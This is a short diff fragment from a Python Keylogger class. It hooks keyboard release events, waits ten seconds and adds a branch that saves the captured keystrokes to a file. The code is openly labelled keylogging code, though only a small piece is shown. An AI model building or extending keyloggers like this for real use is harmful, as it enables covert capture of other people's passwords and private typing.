@@ -43,3 +43,7 @@ class Keylogger:
             keyboard.on_release(callback=self.on_release)
             time.sleep(10)  # Pause de 10 secondes
             self.end_dt = datetime.now()
+            if self.report_method == "file":
+                self.report_to_file()
+            else:
+                pass
